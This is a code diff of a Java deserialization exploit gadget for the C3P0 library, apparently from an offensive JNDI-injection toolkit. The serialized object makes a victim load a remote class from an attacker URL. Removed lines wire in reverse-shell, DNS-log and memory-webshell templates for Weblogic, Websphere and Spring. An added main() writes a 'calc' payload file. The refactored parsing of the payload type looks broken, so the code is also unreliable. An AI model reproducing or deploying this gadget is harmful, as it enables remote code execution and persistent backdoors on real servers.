@@ -1,9 +1,9 @@
 package com.nu1r.jndi.gadgets;
 
 import java.io.ByteArrayOutputStream;
+import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.io.PrintWriter;
-import java.lang.reflect.Field;
 import java.sql.SQLException;
 import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
@@ -13,66 +13,32 @@ import javax.naming.Referenceable;
 import javax.sql.ConnectionPoolDataSource;
 import javax.sql.PooledConnection;
 
-import com.nu1r.jndi.template.Weblogic.WeblogicMemshellTemplate1;
-import com.nu1r.jndi.template.Weblogic.WeblogicMemshellTemplate2;
-import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
-import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
-import com.nu1r.jndi.template.spring.SpringMemshellTemplate;
-import com.nu1r.jndi.utils.Config;
+import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.mchange.v2.c3p0.PoolBackedDataSource;
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
-import com.nu1r.jndi.template.*;
 
 
 public class C3P0 {
+    public static void main(String[] args) throws Exception {
+        byte[]           bytes = getBytes(PayloadType.command, "calc");
+        FileOutputStream fous  = new FileOutputStream("6666.ser");
+        fous.write(bytes);
+        fous.close();
+    }
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
-
-        String className;
-        switch (type) {
-            case command:
-                CommandTemplate commandTemplate = new CommandTemplate(param[0]);
-                commandTemplate.cache();
-                className = commandTemplate.getClassName();
-                break;
-            case dnslog:
-                DnslogTemplate dnslogTemplate = new DnslogTemplate(param[0]);
-                dnslogTemplate.cache();
-                className = dnslogTemplate.getClassName();
-                break;
-            case reverseshell:
-                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(param[0], param[1]);
-                reverseShellTemplate.cache();
-                className = reverseShellTemplate.getClassName();
-                break;
-            case tomcatecho:
-                className = TomcatEchoTemplate.class.getName();
-                break;
-            case springecho:
-                className = SpringEchoTemplate.class.getName();
-                break;
-            case weblogicecho:
-                className = WeblogicEchoTemplate.class.getName();
-                break;
-            case weblogicmemshell1:
-                className = WeblogicMemshellTemplate1.class.getName();
-                break;
-            case weblogicmemshell2:
-                className = WeblogicMemshellTemplate2.class.getName();
-                break;
-            case webspherememshell:
-                className = WebsphereMemshellTemplate.class.getName();
-                break;
-            default:
-                throw new IllegalStateException("Unexpected value: " + type);
+        String      command = String.valueOf(type);
+        int sep = command.lastIndexOf(':');
+        if (sep < 0) {
+            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
         }
 
-        PoolBackedDataSource b     = PoolBackedDataSource.class.newInstance();
-        Field                field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
-        field.setAccessible(true);
-        field.set(b, new PoolSource(className, "http://" + Config.ip + ":" + Config.httpPort + "/"));
+        String url       = command.substring(0, sep);
+        String className = command.substring(sep + 1);
 
-        //序列化
+        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
+        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
+
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
         ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(b);
@@ -86,6 +52,7 @@ public class C3P0 {
     private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
 
         private String className;
+
         private String url;
 
         public PoolSource(String className, String url) {
@@ -122,5 +89,6 @@ public class C3P0 {
         public PooledConnection getPooledConnection(String user, String password) throws SQLException {
             return null;
         }
+
     }
 }
